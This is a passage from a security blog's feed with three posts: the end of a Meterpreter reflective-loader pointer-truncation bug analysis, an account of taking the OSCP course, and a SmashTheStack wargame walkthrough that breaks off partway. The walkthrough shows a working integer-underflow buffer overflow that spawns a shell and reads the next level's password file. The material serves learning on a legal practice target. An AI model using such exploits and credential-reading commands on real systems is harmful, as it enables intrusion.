<p>So the function returns a <a href="http://msdn.microsoft.com/en-us/library/cc230394.aspx" title="ULONG_PTR">ULONG_PTR</a> (which is 64-bits) but the function pointer type returned a <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a> (which is 32-bits). This is what was causing the truncation of the pointer and effectively zeroing out the higher-order DWORD of <code>pDllMain</code>. The fix was to simply change the return type of the function pointer to match:</p>

<p>{% codeblock lang:c %}
typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>Problem solved.</p>

<h2>Extra Thoughts and Conclusion</h2>

<p>For those of you who are wondering, like I was, why this was an intermittent problem the answer lies in the fact that the new versions of Windows have newer versions of <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" title="Adress Space Layout Randomisation">ASLR</a>. To quote Stephen:</p>

<blockquote><p>The bug was triggering on Server 2012 but not other 64bit systems
probably due to high entropy ASLR making allocations over the 4gig boundary.</p></blockquote>

<p>Earlier versions of Windows didn&rsquo;t have an ASLR implementation that resulted in memory allocations over the 4GB boundary. As a result, the higher-order DWORD was always zero anyway, which meant that the truncation had no impact.</p>

<p>This was a really fun bug to analyse and track down. I&rsquo;m glad we got to the bottom of it. Again I&rsquo;d like to thank Stephen for his involvement in locating the source of the problem.</p>

<p>The new and improved version of Meterpreter that contains this fix will be landing in Metasploit very soon (I hope). Thanks for reading. Comments and feedback are welcomed.  <a name="Edit15thSep"></a></p>

<h2>Edit 15th September</h2>

<p>Today on Twitter <a href="https://twitter.com/KronicDeth" title="Luke Imhoff @ Twitter">Luke Imhoff</a> asked me a good question:</p>

<blockquote class="twitter-tweet"><p><a href="https://twitter.com/TheColonial">@TheColonial</a> why didn&#39;t the compiler issue a truncation warning?</p>&mdash; Luke Imhoff (@KronicDeth) <a href="https://twitter.com/KronicDeth/statuses/378878334249095168">September 14, 2013</a></blockquote>


<script async src="http://buffered.io//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>I answered quickly but realised after that I was a bit hasty, so I&rsquo;m going to clarify on here instead.</p>

<p>We need to review a few snippets of code to understand why the compiler didn&rsquo;t complain. Firstly, the function-pointer type definition (prior to the fix):</p>

<p>{% codeblock ReflectiveDllInjection.h (partial) lang:c %}
typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>Second, the declaration of the <code>ReflectiveLoader()</code> function:</p>

<p>{% codeblock ReflectiveLoader.c (partial) lang:c %}</p>

<h1>ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )</p>

<h1>else</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )</p>

<h1>endif</h1>

<p>{
   // &hellip; snip &hellip;
}
{% endcodeblock %}</p>

<p>Third, the declaration of both <code>pDllMain</code> and <code>pReflectiveLoader</code>:</p>

<p>{% codeblock LoadLibraryR.c (partial) lang:c %}
REFLECTIVELOADER pReflectiveLoader = NULL;
DLLMAIN pDllMain                   = NULL;
{% endcodeblock %}</p>

<p>Finally, the actual calls that use these pointers:</p>

<p>{% codeblock LoadLibraryR.c (partial) lang:c %}
pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);
// &hellip; snip &hellip;
pDllMain = (DLLMAIN)pReflectiveLoader();
{% endcodeblock %}</p>

<p>As we can see, <code>pReflectiveLoader</code> is set via a cast from a <code>UINT_PTR</code> type, which maps to the right sized pointer for whatever platform it&rsquo;s compiled on. Casting a <code>UINT_PTR</code> to a <code>REFLECTIVELOADER</code> type doesn&rsquo;t change the size.</p>

<p>At first I though the reason there was no compiler warning was because the result of calling <code>pReflectiveLoader</code> was cast to a <code>DLLMAIN</code> type, effectively hiding the problem, but that&rsquo;s not correct. If <code>pDllMain</code> was just a <code>ULONG_PTR</code> instead of <code>DLLMAIN</code> and no casting was used it still wouldn&rsquo;t have resulted in a problem because the return type of <code>REFLECTIVELOADER</code> is <em>smaller</em>, and hence an implicit cast would have turned this into a 64-bit value without complaining. The truncation has already happened because of the incorrect return type of <code>REFLECTIVELOADER</code>.</p>

<p>Ultimately the problem is down to the disconnect between the function pointer type and the function implementation type.</p>

<p>Thanks for the great question Luke.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OSCP and Me]]></title>
    <link href="http://buffered.io/posts/oscp-and-me/"/>
    <updated>2013-08-16T20:33:00+10:00</updated>
    <id>http://buffered.io/posts/oscp-and-me</id>
    <content type="html"><![CDATA[<p>The <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/" title="Penetration Testing with BackTrack">PWB</a> course by <a href="http://www.offensive-security.com/" title="Offensive Security">Offensive Security</a> is absolutely awesome, as is the exam which earns you the prized <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a> certification. I took this course and exam recently; I loved it and I nailed it! I am now equipped with a much better understanding of the security world and am in a better position to help businesses improve the security of their application architecture and infrastructure.</p>

<p><a href="/contact" title="Contact OJ">Hit me up</a> and let&rsquo;s talk about how I can help you make your applications more secure.</p>

<p>What follows is the full story of my path through PWB and OSCP. Enjoy.</p>

<!--more-->


<h2>The Long Version</h2>

<p>I started developing software professionally back in 1999, just shy of 15 years ago. Since then I&rsquo;ve been fortunate enough to work in some pretty amazing domains, used a massive variety of technologies and have played a part in some <a href="http://burnoutrevenge.ea.com/360/player.asp?language=en" title="Burnout Revenge for Xbox 360">pretty</a> <a href="https://internetbanking.suncorpbank.com.au/" title="Suncorp Internet Banking">awesome</a> <a href="http://www.innovation.gov.au/Industry/Defence/CapabilityDirectories/Documents/JSFCapabilityDirectory/company%20profiles/ball_solutions/profile_3.html" title="Mission Data Planning Environment">software</a>. I&rsquo;m proud of what I&rsquo;ve achieved so far. However I&rsquo;ve recently found myself looking for a new challenge. Something that will make me think, push me to learn new things, and hopefully keep my motivation levels up to a high level. Ultimately, I wanted to have a bit of a career change without really changing my career.</p>

<p>Towards the end of last year, after some careful deliberation, I decided to follow a long-term passion of mine with a goal of incorporating it into my work. That passion is <a href="http://en.wikipedia.org/wiki/Information_security" title="Information Security">Information Security</a>. Infosec as a domain is made up of a <em>lot</em> of different areas, and hence making it a point of focus means that anyone looking to get involved needs to first learn the basics of a broad set of topics and then, perhaps, <em>specialise</em> in one of them.</p>

<p>For many years I&rsquo;ve <a href="http://buffered.io/categories/rce/" title="Category: RCE">dabbled with reverse engineering</a>, kept up-to-date with various security topics, and have been quite a <a href="http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies/" title="XSS Flaws via MVC Model Binding and Request.QueryString Inconsistencies">security-minded developer</a>. I didn&rsquo;t want to just go and read up on the things that I already knew, but instead I wanted to throw myself in the deep end into an area that I wasn&rsquo;t too familiar with but had a keen interest in.</p>

<p>This led me to <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Test">penetration testing</a> and ultimately to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a>.</p>

<h2>Exploring OSCP</h2>

<p>I spent quite a bit of time searching for courses and material that would get me going with the basics of penetration testing servers and web applications. There&rsquo;s quite a lot out there, though much of it is rudimentary, is disjoint or lacks cohesion, or talks about &ldquo;point and shoot&rdquo; exploitation. While this might be helpful in becoming a <a href="http://en.wikipedia.org/wiki/Script_kiddie" title="Script Kiddie">script kiddie</a> it wasn&rsquo;t what I was looking for. I wanted to be challenged.</p>

<p>When I stumbled on <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a> I was initially dubious as I am when it comes to any certification. Most developers out there are probably experienced with the certifications that exist in the world of software engineering and how they do not provide an indication of a person&rsquo;s ability. Before knowing better I assumed this would be the same.</p>

<p>However, after <a href="http://proactivedefender.blogspot.com/2012/01/oscp-my-review.html">reading</a> <a href="http://www.hackyeah.com/2010/12/brief-review-of-the-pwb-class-and-the-oscp-certification/">some</a> <a href="http://blog.nullmode.com/2013/05/penetration-testing-with-backtrack-oscp.html">reviews</a> from people who have achieved the certification, I started to realise that this is exactly the kind of thing I was looking for.</p>

<p>Quotes from these reviews include lines such as:</p>

<blockquote><p>The truism &ldquo;anything worth having doesn&rsquo;t come easy&rdquo; is one I have often remembered when on a particularly difficult path to a goal. Never have the words rung quite so true when applied to my quest for [the] OSCP certification.</p></blockquote>

<p>Others state:</p>

<blockquote><p>The OSCP certification, in my opinion, proves that it&rsquo;s holder is able to identify vulnerabilities, create and modify exploit code, exploit hosts, and successfully preform tasks on the compromised systems over various operating systems.</p></blockquote>

<p>I was becoming convinced that OSCP was something that I had to do, despite not ever doing any form of penetration testing in the past (other than fumbling around my own web applications). At this point I reached out to a local security professional, <a href="http://security.crudtastic.com/" title="Security with added Cheese">Ash D</a> who is a seasoned Infosec guru, SANS mentor/teacher and who has passed the exam himself, and bribed him with a free lunch to come and talk to me about his experience. He turned out to be friendly, fun, informative and gave me just the confirmation I was looking for. Even if I failed miserably I&rsquo;d already made a good friend out of the experience (a friend who later would keep encouraging me right through to the end <a href="http://security.crudtastic.com/?p=699">and beyond</a>, thanks Ash).</p>

<p>OSCP requires you to spend a lot of time in a virtual lab practising the various techniques that you&rsquo;ll need to master to do well in the exam. While the learning material from Offensive Security is good (more on this later), the lab is what makes the whole thing <strong>great</strong>. This was the last key point for me. I wasn&rsquo;t just going to learn theory, I would actually learn to <em>do</em> things and have to <em>demonstrate</em> that in the exam to gain the certification.</p>

<h2>Getting Started</h2>

<p>It was early 2013 and I was working some longer hours for various clients which made it hard for me to find the time to put into some basic preparation. As a result it took me quite a while to sign up for the course as I wanted to make sure that I would be able to give it the time it deserves.</p>

<p>As April 2013 approached I came to the realisation that it was <em>never</em> a good time to sign up for something like this and hence I should just go and make it happen. I spoke to my wife and kids about it and made sure they were OK with the idea of me being locked away to learn, and they gave me their full support (short interlude: my family is awesome).</p>

<p>I jumped on the web and went to the <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/" title="PWB sign up">sign-up</a> page and was presented with quite a few options. I needed to specify how much lab time I wanted prior to my exam. This was a bit like telling a mobile phone carrier how many calls you&rsquo;re going to make; I really wasn&rsquo;t sure! Instead of deliberating for too long, I decided to go with the 30-day option and extend my time if I felt that I needed more. No big deal.</p>

<p>I signed up for the course, and locked in the date of June 16th to kick off my time in the labs.I was really excited, and couldn&rsquo;t wait for it to start. In the following days I was contacted by Offsec and asked for proof of identity. Offsec require that you don&rsquo;t use a &ldquo;free&rdquo; email address such as Gmail when signing up, however I don&rsquo;t have any email addresses that aren&rsquo;t Google Apps hosted (this will change soon) and hence I needed to verify my identity with them. This goes to show that they don&rsquo;t just let any unknown person take up the course to learn things which can easily be misused.</p>

<p>After what felt like an eternity, June 16th came around and my connection pack arrived in my inbox. Unfortunately for me, work and a few other things took over and I lost the first week of time. I was able to connect to the labs on the odd occasion but for very short periods of time. Given that I wasn&rsquo;t yet across the material that time I spent in the labs wasn&rsquo;t really fruitful.</p>

<p>At day 8 things finally settled down to a level where I was able to dive into the material and begin fumbling my way through the lab. This is where things really started to become entertaining.</p>

<h2>Initial Lab Time</h2>

<p>My first few days in the lab were interesting. I popped the SYSTEM account on one of the Windows boxes in the first 4 hours of my lab time. This was not only surprising but it gave me a confidence boost which didn&rsquo;t do me any favours. From there I failed repeatedly to compromise another machine. The second day yielded no results. The third day was also fruitless. By the end of the fourth day, when I still had just <em>one</em> machine on my tally, I was beginning to ask myself questions. Am I cut out for this? Have I bitten off more than I can chew?</p>

<p>I stepped back for a while and pondered my approach. I realised that I wasn&rsquo;t thinking and looking to learn. I wasn&rsquo;t approaching the problems like a hacker would. I wasn&rsquo;t doing enumeration properly. I was investing too much time looking for out-of-the-box exploits rather than trying to connect the dots myself. I gave myself a slap, and started again.</p>

<p>This is when things started to change. Machines started to fall. I started to learn more. I improved in all the areas I was failing at before. It was wonderful.</p>

<p>On the fifth day I managed to pop 7 machines. What a difference!</p>

<h2>Proper Lab Time</h2>

<p><em>Note: my coverage of the lab from here is &ldquo;point in time&rdquo;. Offsec change and upgrade the lab all the time, and hence details of the lab and what you&rsquo;ll experience will change over time too.</em></p>

<p>The lab was a wonderful place to play, practice and learn. I was constantly blown away by the mixture of operating systems, patch levels, kernel versions, system application and feature versions, third-party applications, and even custom applications that had been built which emulated the kind of things you&rsquo;d expect a developer to throw together to help them do something a little easier and quicker as part of their day job. The effort that has gone into the design and set up of the lab environment is commendable. It really felt like I was in a real network with real machines and real people using those machines.</p>

<p>It was made up of approximately 60 machines partitioned into a number of networks. Each machine has it&rsquo;s own identity and story, some are interesting and some not so much. I&rsquo;m not going to elaborate on the detail too much because discovering that is all part of the fun. But I will say that I experienced <code>Pain</code> and <code>Sufference</code> [sic] in ways I didn&rsquo;t expect.</p>

<p>The networks are connected together in interesting ways, and you as the penetration tester will need to work your way through the machines and networks, pivoting your attacks off compromised hosts as you go with the end goal of compromising all of the hosts and making it to the <strong>Admin</strong> network.</p>

<p>As you would expect, some machines are very easy to break into and other machines are really quite hard. The beauty of the lab is that, depending on your background, exposure and interests, the machines that you find hard might not be hard for others and vice-versa. Some machines run applications you wouldn&rsquo;t expect them to run. Some machines have very new or very old configurations of software. The mix is truly great; it keeps you thinking rather than giving you the luxury of slipping into a &ldquo;routine&rdquo;.</p>

<p>The lab exposes you to a very large range of exploitations; too many to mention here. Chances are that if a type of exploit exists that you need to abuse, you&rsquo;ll get the chance to use it in the lab.</p>

<p>At this point I think it&rsquo;s important to point out that in OSCP the focus is on knowing how to apply existing public exploits and known approaches to manual exploitation of vulnerabilities. While there is room for you to construct your own exploits if you choose to, there is another course offered by Offsec which covers that in more detail, and that&rsquo;s <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert">OSCE</a>.</p>

<p>It took me a little bit of time before I realised that exploitation wasn&rsquo;t the only thing that I needed to do while in the lab. <em>Post-exploitation</em> was very important. Looting the machines that I&rsquo;d compromised was something that I didn&rsquo;t consider doing in the early days, and I suffered as a result. When I came to realise that the keys to some of the machines were located on others, I had to go back through my list of popped hosts and loot them properly. If you&rsquo;re going to do this course, make sure you do a good job of post-exploitation!</p>

<p>While doing the lab, you are supposed to keep track of all the work you&rsquo;ve done as you need to provide a deliverable at the end of it: a full penetration test document. This document has to contain the detail of what you did and how you did it. My advice is to not put this off until the end, but instead work on it as you go. This includes screenshots, dumps of console output, source code to exploits you&rsquo;ve written and scripts you&rsquo;ve used to automate tasks.</p>

<p>Even though I was pretty good at taking notes, I had kept them all in markdown in a private <a href="http://git-scm.org/" title="Git">git</a> repository instead of putting them in a well-structured document. As a result, I had to do this after my exam, which made the experience more painful than it needed to be.</p>

<h2>Post-Lab</h2>

<p>By then time your lab time has ended, you <em>should</em> have managed to compromise/pop/pwn a large percentage of the networks, if not 100%. In my case, I ran out of time and I missed about 8 machines in total. While I was disappointed with the result, a discussion with various OSCP alumni led me to realise that I had managed to defeat the harder machines in the labs and hence the rest of them would be quite simple. I decided not to extend my lab time as spending extra money for the sake of a few more machines didn&rsquo;t make sense. Instead, I booked in my exam for August 6th and used the lead-up time for practice, refining my documentation, and preparing my scripts and cheat sheets for the big day.</p>

<p>There are some great resources out there for practising this kind of thing, but the main one that I want to point out is <a href="http://vulnhub.com/" title="Vulnhub">Vulnhub</a> (a pet project of <a href="http://blog.g0tmi1k.com/" title="g0tmi1k's blog">g0tmi1k</a>). That site contains downloadable <em>boot2root</em> images that you can use to practice on with the added benefit of it all being legal.</p>

<p>I really focused on the areas that I felt I was weakest, with the main one being Linux privilege escalation. There&rsquo;s a bit of material out there on it, and there&rsquo;s also g0tmi1lk&rsquo;s fantastic <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html" title="Basic Linux Privilege Escalation">cheat sheet</a>, but I still failed to connect some of the dots during my travels. It&rsquo;s about now I must give a bit hat-tip to <a href="https://twitter.com/pipesec" title="Pipes on Twitter">Pipes</a> and <a href="https://twitter.com/metlstorm" title="Metlstorm on Twitter">Metlstorm</a>, both of <a href="http://www.insomniasec.com/" title="Insomnia Security">Insomnia Security</a>, for being two awesome mentors and providing me with fantastic insights on ways to get root. Those guys are awesome.</p>

<h2>The Exam</h2>

<p>The OSCP exam is a 24-hour &ldquo;loser takes all&rdquo; style exam. You are given access to a custom network, just like you are in the labs, and you have a number of machines assigned to you. The exam pack contains information on the machines, along with various rules that you must adhere to when attacking them. Each machine is worth a number of points and you earn those points if you:</p>

<ul>
<li>Compromise the host.</li>
<li>Document your findings well enough with clear instructions on how it was done. This document should also contain the  &ldquo;flags&rdquo;; text files with what appears to be random characters in them which prove that you did what you did.</li>
<li>Don&rsquo;t break the rules.</li>
</ul>


<p>Points are allocated to you even if you don&rsquo;t managed to get SYSTEM/root on the machine. All is not lost if you can&rsquo;t do privilege escalation! However you <em>can not</em> break the rules. In my exam, for example, there was at least one machine which wasn&rsquo;t allowed to be attacked at all using <a href="http://metasploit.org/" title="Metasploit">MSF</a>. Breaking this rule would have meant 0 points for that machine.</p>

<p>I started my exam at 8am just as the family were leaving the house (taking son #1 to school). I was buzzing. I couldn&rsquo;t sit still I was that excited. I realised how much I had missed my time in the labs and the thought of having another crack was making me twitchy.</p>

<p>By 8:45am I had popped root on my first machine.</p>

<p>By 10:00am the second had fallen. I was on a roll! I was riding high and felt really good.</p>

<p>The third machine proved to be a little more difficult, but it fell just before 1:00pm.</p>

<p>The last two machines, making a total of five, were quite a bit trickier. I&rsquo;d say that the fourth was by far the hardest, but I loved it as it was yet another example of where I learned something new while doing something in an Offsec lab. I w00ted like a teenager when it fell and did a victory lap around the house.</p>

<p>By 10pm I was done with all 5 machines. My notes were in the typical markdown/git repository structure but were quite thorough and had captured everything I had done in quite a lot of detail. With the exam out of the way, and 100 points in the bag, I went to bed.</p>

<p>The following day I had the arguably arduous task of writing my exam document, which was supposed to be included with your lab report. All in all my document totalled 220 pages by the time it was done and I was glad to see the back of it! It was submitted late on Wednesday evening but with plenty of time to spare before the 8am Thursday cut-off.</p>

<p>I was done. I was relieved, excited and sad that it was all over.</p>

<h2>Confirmation</h2>

<p>While I was pretty sure that I&rsquo;d done a good enough job to get my certification, there is always some doubt that you might have missed something or done something silly. So until I received confirmation from Offsec I wasn&rsquo;t sure if I had passed.</p>

<p>It took less than 48 hours for me to receive the email:</p>

<blockquote><p>Dear Oliver,</p>

<p>We are happy to inform you that you have successfully completed the Penetration Testing with BackTrack certification challenge and have obtained your Offensive Security Certified Professional (OSCP) certification.</p>

<p>You will receive the certification by mail within 80 days.</p></blockquote>

<p>I was elated. What a journey! I really felt like I had achieved something. I truly felt, and still feel, that I&rsquo;d be able to do a great job performing a penetration test for a client.</p>

<h2>Summary &amp; Conclusion</h2>

<p>There&rsquo;s no denying it, OSCP was just fantastic. But same parts of it were <em>hard</em>. Not impossibly hard, but hard enough to make you question your own abilities. It broke my ego and then built it up again. I can&rsquo;t recommend it strongly enough!</p>

<p>However if you&rsquo;re new to the security game, this probably isn&rsquo;t the first thing you should attempt to tackle. I think I managed to get through thanks to my polyglot development background, my history with a mixture of operating systems, and my time reverse engineering various binaries. Without those things I would have had a very, <em>very</em> hard time.</p>

<p>I&rsquo;m very happy that I took this challenge on. I feel like I really achieved something and that I have a certification that means a whole more than the paper it&rsquo;s written on. I can&rsquo;t wait to see the official paperwork come through the mail.</p>

<p>So what&rsquo;s next? Certification-wise it has to be <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert">OSCE</a>, but I will give my family a break before I take that on. Work-wise, I will be looking to engage with new and existing clients to determine how best I can help them with the security of their infrastructure and applications in the hope that this becomes a major part of my work longer term.</p>

<p>If you&rsquo;re out there reading this and you are looking for some help in this area, please <a href="/contact" title="Contact OJ">drop me a line</a>.</p>

<p>Thank you all for reading. Feel free to hit me with any questions and I&rsquo;ll do my best to answer them.</p>

<p><a href="https://twitter.com/TheColonial" title="OJ on Twitter">OJ</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Levels 7 and 7_alt - IO at STS]]></title>
    <link href="http://buffered.io/posts/levels-7-and-7_alt-io-at-sts/"/>
    <updated>2013-08-15T13:51:00+10:00</updated>
    <id>http://buffered.io/posts/levels-7-and-7_alt-io-at-sts</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been documenting my experiences with <a href="http://io.smashthestack.org:84/" title="IO @ Smash The Stack">IO</a> at <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the <code>alt</code> level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven&rsquo;t had a play on the <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> wargames yet, I really do recommend it. They&rsquo;re great fun.</p>

<!--more-->


<h2>Spoiler Alert</h2>

<p>This post covers, in detail, how to get past level 7 and level 7 alt. If you haven&rsquo;t done these levels yourself yet, and you plan to, then please don&rsquo;t read this until you&rsquo;ve nailed them yourself. I&rsquo;d hate for this to ruin your experience.</p>

<p>However, if you&rsquo;ve done the level or you&rsquo;re just interested in what&rsquo;s involved, please read on.</p>

<h2>Connecting</h2>

<p>Fire up a shell and connect to the game server with the password for the <code>level7</code> user (I won&rsquo;t be sharing passwords here).</p>

<p>{% codeblock lang:bash %}
$ ssh <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#108;&#101;&#118;&#101;&#108;&#55;&#64;&#105;&#x6f;&#x2e;&#115;&#x6d;&#97;&#x73;&#x68;&#x74;&#x68;&#101;&#115;&#x74;&#97;&#99;&#x6b;&#46;&#111;&#x72;&#103;">&#x6c;&#101;&#x76;&#x65;&#108;&#55;&#x40;&#x69;&#111;&#46;&#x73;&#x6d;&#x61;&#115;&#x68;&#116;&#x68;&#101;&#x73;&#116;&#97;&#99;&#107;&#x2e;&#111;&#114;&#x67;</a>
{% endcodeblock %}</p>

<p>Let&rsquo;s see what challenges there are for us:</p>

<p>{% codeblock lang:bash %}
level7@io:~$ ls /levels/level07*
/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
{% endcodeblock %}</p>

<p>This level has two possible entry points, and we&rsquo;ll be covering both in this post.</p>

<h2>Level 07</h2>

<p>We start by looking at the source of the target program:</p>

<p>{% codeblock level07.c lang:c %}
//written by bla</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main(int argc, char **argv)
{</p>

<pre><code>    int count = atoi(argv[1]);
    int buf[10];

    if(count &gt;= 10 ) 
            return 1;

    memcpy(buf, argv[2], count * sizeof(int));

    if(count == 0x574f4c46) {
            printf("WIN!\n");
            execl("/bin/sh", "sh" ,NULL);
    } else
            printf("Not today son\n");

    return 0;
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>What&rsquo;s clear here is that we need to pass a number in that is less than <code>10</code>, but is big enough to allow us to overflow <code>buf</code> so that we can modify the value of <code>count</code>. The data that&rsquo;s written to <code>buf</code> is only allowed to be <code>count * sizeof(int)</code> in size.  We can easily pass in numbers smaller than 10, but they won&rsquo;t be big enough to overflow <code>buf</code>. If we pass in a <em>negative</em> number we bypass the check, but the call to <code>memcpy</code> will fail because <code>count * sizeof(int)</code> is negative.</p>

<p>We need to find a way of turning this calculation into something positive, but also much bigger than <code>10 * sizeof(int)</code> so that we can overflow <code>buf</code>.</p>

<p>What&rsquo;s interesting about this is that <code>sizeof(int)</code> on a 32-bit machine is <code>4</code>, which is effectively a <code>SHL 2</code> operation. We can confirm this by disassembling <code>main</code> and looking at the generated output:</p>

<p>{% codeblock lang:bash %}
gdb$ disas main
Dump of assembler code for function main:
0x08048414 &lt;main+0>:    push   ebp
0x08048415 &lt;main+1>:    mov    ebp,esp
0x08048417 &lt;main+3>:    sub    esp,0x68
0x0804841a &lt;main+6>:    and    esp,0xfffffff0
0x0804841d &lt;main+9>:    mov    eax,0x0
0x08048422 &lt;main+14>:   sub    esp,eax
0x08048424 &lt;main+16>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048427 &lt;main+19>:   add    eax,0x4
0x0804842a &lt;main+22>:   mov    eax,DWORD PTR [eax]
0x0804842c &lt;main+24>:   mov    DWORD PTR [esp],eax
0x0804842f &lt;main+27>:   call   0x8048354 &lt;atoi@plt>
0x08048434 &lt;main+32>:   mov    DWORD PTR [ebp-0xc],eax
0x08048437 &lt;main+35>:   cmp    DWORD PTR [ebp-0xc],0x9
0x0804843b &lt;main+39>:   jle    0x8048446 &lt;main+50>
0x0804843d &lt;main+41>:   mov    DWORD PTR [ebp-0x4c],0x1
0x08048444 &lt;main+48>:   jmp    0x80484ad &lt;main+153>
0x08048446 &lt;main+50>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048449 &lt;main+53>:   shl    eax,0x2                          &lt;&ndash; here
0x0804844c &lt;main+56>:   mov    DWORD PTR [esp+0x8],eax
0x08048450 &lt;main+60>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048453 &lt;main+63>:   add    eax,0x8
0x08048456 &lt;main+66>:   mov    eax,DWORD PTR [eax]
0x08048458 &lt;main+68>:   mov    DWORD PTR [esp+0x4],eax
0x0804845c &lt;main+72>:   lea    eax,[ebp-0x48]
0x0804845f &lt;main+75>:   mov    DWORD PTR [esp],eax
0x08048462 &lt;main+78>:   call   0x8048334 &lt;memcpy@plt>
0x08048467 &lt;main+83>:   cmp    DWORD PTR [ebp-0xc],0x574f4c46
0x0804846e &lt;main+90>:   jne    0x804849a &lt;main+134>
0x08048470 &lt;main+92>:   mov    DWORD PTR [esp],0x8048584
0x08048477 &lt;main+99>:   call   0x8048344 &lt;printf@plt>
0x0804847c &lt;main+104>:  mov    DWORD PTR [esp+0x8],0x0
0x08048484 &lt;main+112>:  mov    DWORD PTR [esp+0x4],0x804858a
0x0804848c &lt;main+120>:  mov    DWORD PTR [esp],0x804858d
0x08048493 &lt;main+127>:  call   0x8048324 &lt;execl@plt>
0x08048498 &lt;main+132>:  jmp    0x80484a6 &lt;main+146>
0x0804849a &lt;main+134>:  mov    DWORD PTR [esp],0x8048595
0x080484a1 &lt;main+141>:  call   0x8048344 &lt;printf@plt>
0x080484a6 &lt;main+146>:  mov    DWORD PTR [ebp-0x4c],0x0
0x080484ad &lt;main+153>:  mov    eax,DWORD PTR [ebp-0x4c]
0x080484b0 &lt;main+156>:  leave<br/>
0x080484b1 &lt;main+157>:  ret  <br/>
End of assembler dump.
{% endcodeblock %}</p>

<p>Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use <code>SHL</code> with numbers of a small enough negative value, those values become positive. Let&rsquo;s have a look at that in action by whipping up a sample program and viewing the output:</p>

<p>{% codeblock Testing Shifts Source lang:c %}
int main(int argc, char **argv)
{</p>

<pre><code>int x = -2147483647;
printf("%p\n", x);
printf("%p\n", x &lt;&lt; 2);
printf("%p\n", (x + 16) &lt;&lt; 2);
printf("%p\n", (x + 32) &lt;&lt; 2);
return 0;
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>Compile this code with <code>gcc</code> and run it, and you&rsquo;ll find the following:</p>

<p>{% codeblock Testing Shifts lang:bash %}
level7@io:/tmp/tc7$ ./a.out
0x80000001
0x4
0x44
0x84
{% endcodeblock %}</p>

<p>So we can pass in a negative integer, have it shift and turn it into a positive that&rsquo;s big enough to overflow the buffer. Once we&rsquo;ve overflowed, all we need to do is write the value <code>0x574f4c46</code> to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it&rsquo;ll end up being written to where we need it to be: in the <code>count</code> varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let&rsquo;s see how this looks:</p>

<p>{% codeblock Exploit Run lang:bash %}
level7@io:$ /levels/level07 -2147483600 <code>perl -e 'print "\x46\x4c\x4f\x57" x 100'</code>
WIN!
sh-4.1$ cat /home/level8/.pass
&lt;&lt; &mdash; password was printed here &mdash; >>
{% endcodeblock %}</p>

<p>This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.</p>

<h2>Level 07 alt</h2>

<p>Let&rsquo;s start with the source of the alternate application, modified a little by me (and highlighted):</p>

<p>{% codeblock level07_alt.c lang:c %}
/*</p>

<pre><code>Coding by LarsH

PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,
this program can also be used to get the letter frequencies from a text  &lt;-- I added this
TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.
which helps when cracking standard monosubstitution ciphers              &lt;-- I added this
</code></pre>

<p>*/</p>

<h1>include &lt;stdio.h></h1>

<p>static int count[256];</p>

<p>int main(int argc, char **argv) {</p>

<pre><code>int i, j;

if(argc == 1) {
    printf("Usage: %s words\n", argv[0]);
    return 1;
}

/* Clear out the frequency buffer */
for(i=0; i&lt;256; i++)
    count[i] = 0;

/* Fill the frequency buffer */
for(j=1; argv[j]; j++)
    for(i=0; argv[j][i]; i++)
        count[argv[j][i]]++;

/* Print out the frequency buffer */
for(i=0; i&lt;256; i++)
    if(count[i])
        printf("%c found %i time%s\n", i, count[i], count[i]-1?"s":"");

return 0;
</code></pre>

<p>}
{% endcodeblock %}</p>

